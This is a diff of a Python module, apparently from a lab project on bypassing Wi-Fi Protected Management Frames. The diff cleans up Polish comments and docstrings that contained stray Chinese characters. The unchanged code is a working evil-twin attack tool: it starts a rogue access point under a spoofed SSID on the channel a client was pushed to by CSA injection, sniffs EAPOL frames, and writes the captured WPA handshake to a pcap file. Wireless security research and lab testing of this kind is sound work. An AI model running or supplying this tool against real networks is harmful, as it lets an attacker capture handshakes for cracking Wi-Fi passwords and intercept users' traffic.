@@ -1,21 +1,8 @@
 #!/usr/bin/env python3
 """
-PMF Bypass — Evil Twin AP Module
-
-Tworzy fałszywy Access Point z tym samym SSID co合法ny AP,
-na kanale docelowym (po CSA injection). Przechwytuje 4-way handshake
-od klienta który przełączył się na złośliwy kanał.
-
-Usage (as module):
-    from attacks.evil_twin import EvilTwinAP
-    evil = EvilTwinAP(ssid="PMF_Lab_Secure", channel=11, iface="wlan2")
-    evil.start()
-    handshake = evil.capture_handshake(timeout=30)
-    evil.save_handshake(handshake, "captured.pcap")
-    evil.stop()
-
-Usage (standalone):
-    sudo python3 attacks/evil_twin.py --ssid PMF_Lab_Secure --channel 11
+modul evil twin ap
+tworzy falszywy access point z tym samym ssid co legalny ap na kanale docelowym
+przechwytuje 4-way handshake od klienta ktory przelaczyl sie na zlosliwy kanal
 """
 
 import argparse
@@ -26,8 +13,8 @@ import time
 from datetime import datetime
 from pathlib import Path
 
-# Note: In Mininet-WiFi context, these imports work via mn_wifi.
-# For standalone use outside Mininet, use system hostapd.
+# w kontekscie Mininet-WiFi importy dzialaja przez mn_wifi
+# dla standalone uzywa sie systemowego hostapd
 try:
     from mn_wifi.net import Mininet_wifi
 except ImportError:
@@ -38,24 +25,24 @@ from scapy.all import sniff, wrpcap, EAPOL
 
 class EvilTwinAP:
     """
-    Evil Twin Access Point — fałszywy AP do przechwytywania handshake.
+    evil twin access point - falszywy ap do przechwytywania handshake
 
-    Uruchamiany na kanale docelowym po ataku CSA injection.
-    Klient widzi znajomy SSID i próbuje się połączyć → ujawnia handshake.
+    uruchamiany na kanale docelowym po ataku csa injection
+    klient widzi znajomy ssid i probuje sie polaczyc -> ujawnia handshake
     """
 
     def __init__(self, ssid, channel, iface=None, passphrase=None):
         self.ssid = ssid
         self.channel = channel
         self.iface = iface
-        self.passphrase = passphrase or "LabTest123!"  # Must match合法ny AP
+        self.passphrase = passphrase or "LabTest123!"  # musi pasowac do legalnego ap
         self._running = False
         self._net = None
         self._ap = None
         self._handshake_packets = []
 
     def start(self):
-        """Uruchamia Evil Twin AP."""
+        """uruchamia evil twin ap"""
         if Mininet_wifi is None:
             self._start_standalone()
             return
@@ -73,7 +60,7 @@ class EvilTwinAP:
         print(f"[EvilTwin] Started on channel {self.channel}, SSID: {self.ssid}")
 
     def _start_standalone(self):
-        """Uruchamia Evil Twin AP używając systemowego hostapd (poza Mininet)."""
+        """uruchamia evil twin ap uzywajac systemowego hostapd (poza Mininet)"""
         import subprocess
         import tempfile
 
@@ -106,13 +93,13 @@ rsn_pairwise=CCMP
 
     def capture_handshake(self, timeout=30):
         """
-        Nasłuchuje pakietów EAPOL (4-way handshake) na interfejsie AP.
+        nasluchuje pakietow eapol (4-way handshake) na interfejsie ap
 
-        Args:
-            timeout: czas nasłuchiwania w sekundach
+        args:
+            timeout: czas nasluchiwania w sekundach
 
-        Returns:
-            Lista przechwyconych pakietów EAPOL
+        returns:
+            lista przechwyconych pakietow eapol
         """
         if not self._running:
             raise RuntimeError("Evil Twin AP not running. Call start() first.")
@@ -132,7 +119,7 @@ rsn_pairwise=CCMP
         return self._handshake_packets
 
     def save_handshake(self, output_path):
-        """Zapisuje przechwycony handshake do pliku PCAP."""
+        """zapisuje przechwycony handshake do pliku pcap"""
         if not self._handshake_packets:
             print("[EvilTwin] No handshake packets to save.")
             return False
@@ -143,7 +130,7 @@ rsn_pairwise=CCMP
         return True
 
     def stop(self):
-        """Zatrzymuje Evil Twin AP i sprząta."""
+        """zatrzymuje evil twin ap i sprzata"""
         self._running = False
 
         if hasattr(self, '_hostapd') and self._hostapd:
@@ -162,13 +149,13 @@ rsn_pairwise=CCMP
 def parse_args():
     parser = argparse.ArgumentParser(description="PMF Bypass: Evil Twin AP")
     parser.add_argument("--ssid", default="PMF_Lab_Secure",
-                        help="SSID to spoof (must match合法ny AP)")
+                        help="SSID to spoof (must match legalny AP)")
     parser.add_argument("--channel", type=int, default=11,
                         help="Channel for Evil Twin AP")
     parser.add_argument("--iface", default=None,
                         help="Wireless interface (for standalone mode)")
     parser.add_argument("--passphrase", default="LabTest123!",
-                        help="WPA passphrase (must match合法ny AP)")
+                        help="WPA passphrase (must match legalny AP)")
     parser.add_argument("--capture-timeout", type=int, default=30,
                         help="Seconds to wait for handshake")
     parser.add_argument("--out", default="evil_twin_handshake.pcap",
